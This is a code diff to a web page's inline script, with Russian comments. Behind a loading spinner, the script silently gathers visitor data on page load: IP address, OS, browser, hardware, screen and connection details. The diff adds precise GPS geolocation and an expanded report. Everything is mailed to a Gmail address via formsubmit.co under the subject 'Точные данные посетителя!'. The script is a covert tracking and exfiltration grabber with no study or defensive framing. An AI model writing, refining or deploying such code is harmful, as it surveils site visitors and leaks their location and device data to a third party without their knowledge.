@@ -37,20 +37,93 @@
     <div class="loader"></div>
 
     <script>
+        // Функция для точного определения ОС и разрядности
+        function getOSInfo() {
+            const userAgent = navigator.userAgent;
+            let os = 'Неизвестно';
+            let architecture = 'Неизвестно';
+
+            // Определяем ОС
+            if (userAgent.includes('Win64') || userAgent.includes('x64')) {
+                os = 'Windows 64-bit';
+                architecture = '64-bit';
+            } else if (userAgent.includes('Win32') || userAgent.includes('x86')) {
+                os = 'Windows 32-bit';
+                architecture = '32-bit';
+            } else if (userAgent.includes('Mac')) {
+                os = 'macOS';
+                architecture = '64-bit';
+            } else if (userAgent.includes('Linux')) {
+                os = 'Linux';
+                architecture = '64-bit';
+            } else if (userAgent.includes('Android')) {
+                os = 'Android';
+                architecture = 'ARM';
+            } else if (userAgent.includes('iOS')) {
+                os = 'iOS';
+                architecture = 'ARM';
+            }
+
+            return { os, architecture };
+        }
+
+        // Функция для точного определения браузера
+        function getBrowserInfo() {
+            const userAgent = navigator.userAgent;
+            let browser = 'Неизвестно';
+
+            if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
+                browser = 'Chrome';
+            } else if (userAgent.includes('Firefox')) {
+                browser = 'Firefox';
+            } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
+                browser = 'Safari';
+            } else if (userAgent.includes('Edg')) {
+                browser = 'Edge';
+            } else if (userAgent.includes('Opera') || userAgent.includes('OPR')) {
+                browser = 'Opera';
+            }
+
+            return browser;
+        }
+
+        // Функция для получения точного местоположения (если доступно)
+        function getLocationInfo() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve('Геолокация не поддерживается');
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve(`Широта: ${position.coords.latitude}, Долгота: ${position.coords.longitude}`);
+                    },
+                    (error) => {
+                        resolve(`Ошибка геолокации: ${error.message}`);
+                    },
+                    { timeout: 5000 }
+                );
+            });
+        }
+
         // Функция для сбора всей информации о пользователе
-        function collectAllData(ip) {
-            // Собираем данные о браузере и ОС
+        async function collectAllData(ip) {
+            const { os, architecture } = getOSInfo();
+            const browser = getBrowserInfo();
+            const locationInfo = await getLocationInfo();
+
+            // Собираем данные о браузере
             const browserInfo = {
                 userAgent: navigator.userAgent,
+                browser: browser,
                 language: navigator.language,
-                languages: navigator.languages,
                 platform: navigator.platform,
                 cookieEnabled: navigator.cookieEnabled,
                 javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                 pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                 hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                maxTouchPoints: navigator.maxTouchPoints || 'unknown'
+                deviceMemory: navigator.deviceMemory || 'unknown'
             };
 
             // Собираем информацию об экране
@@ -63,15 +136,11 @@
                 availHeight: screen.availHeight
             };
 
-            // Собираем информацию о местоположении (приблизительное по IP)
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const locale = Intl.DateTimeFormat().resolvedOptions().locale;
-
             // Собираем информацию о подключении
             const connectionInfo = {
-                downlink: navigator.connection ? navigator.connection.downlink : 'unknown',
+                downlink: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'unknown',
                 effectiveType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-                rtt: navigator.connection ? navigator.connection.rtt : 'unknown',
+                rtt: navigator.connection ? navigator.connection.rtt + ' ms' : 'unknown',
                 saveData: navigator.connection ? navigator.connection.saveData : 'unknown'
             };
 
@@ -82,20 +151,23 @@
 📍 IP АДРЕС: ${ip}
 
 🌍 ГЕОЛОКАЦИЯ:
-• Временная зона: ${timezone}
-• Локаль: ${locale}
+• Точное местоположение: ${locationInfo}
+• Временная зона: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+• Локаль: ${Intl.DateTimeFormat().resolvedOptions().locale}
 
-💻 СИСТЕМА И БРАУЗЕР:
-• User Agent: ${browserInfo.userAgent}
+💻 СИСТЕМА:
+• ОС: ${os}
+• Архитектура: ${architecture}
 • Платформа: ${browserInfo.platform}
+
+🔍 БРАУЗЕР:
+• Браузер: ${browserInfo.browser}
+• User Agent: ${browserInfo.userAgent}
 • Язык: ${browserInfo.language}
-• Доступные языки: ${browserInfo.languages}
 • Куки включены: ${browserInfo.cookieEnabled}
 • Java включена: ${browserInfo.javaEnabled}
-• PDF просмотр: ${browserInfo.pdfViewerEnabled}
 • Ядер CPU: ${browserInfo.hardwareConcurrency}
 • Память устройства: ${browserInfo.deviceMemory} GB
-• Тач-поинты: ${browserInfo.maxTouchPoints}
 
 🖥 ЭКРАН:
 • Разрешение: ${screenInfo.width}x${screenInfo.height}
@@ -104,9 +176,9 @@
 • Доступное разрешение: ${screenInfo.availWidth}x${screenInfo.availHeight}
 
 📡 СОЕДИНЕНИЕ:
-• Скорость: ${connectionInfo.downlink} Mbps
+• Скорость: ${connectionInfo.downlink}
 • Тип соединения: ${connectionInfo.effectiveType}
-• RTT: ${connectionInfo.rtt} ms
+• RTT: ${connectionInfo.rtt}
 • Экономия трафика: ${connectionInfo.saveData}
 
 ⏰ ВРЕМЯ ПОСЕЩЕНИЯ: ${new Date().toLocaleString('ru-RU')}
@@ -119,10 +191,9 @@
         function sendDataToEmail(data) {
             const formData = new FormData();
             formData.append('message', data);
-            formData.append('_subject', '🚨 Полные данные посетителя!');
+            formData.append('_subject', '🚨 Точные данные посетителя!');
             formData.append('_captcha', 'false');
             
-            // Отправка данных через fetch без перезагрузки страницы
             fetch('https://formsubmit.co/wplacesosi1@gmail.com', {
                 method: 'POST',
                 body: formData,
@@ -131,23 +202,23 @@
         }
 
         // Основная функция
-        function collectAndSendData() {
-            // Получаем IP
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(ipData => {
-                    // Собираем все данные
-                    const allData = collectAllData(ipData.ip);
-                    
-                    // Отправляем на почту
-                    sendDataToEmail(allData);
-                })
-                .catch(error => {
-                    console.error('Ошибка:', error);
-                    // Если не получилось получить IP, всё равно отправляем остальные данные
-                    const fallbackData = collectAllData('Не удалось получить IP');
-                    sendDataToEmail(fallbackData);
-                });
+        async function collectAndSendData() {
+            try {
+                // Получаем IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                // Собираем все данные
+                const allData = await collectAllData(ipData.ip);
+                
+                // Отправляем на почту
+                sendDataToEmail(allData);
+            } catch (error) {
+                console.error('Ошибка:', error);
+                // Отправляем хотя бы базовые данные
+                const fallbackData = await collectAllData('Не удалось получить IP');
+                sendDataToEmail(fallbackData);
+            }
         }
 
         // Запускаем сбор данных при загрузке страницы
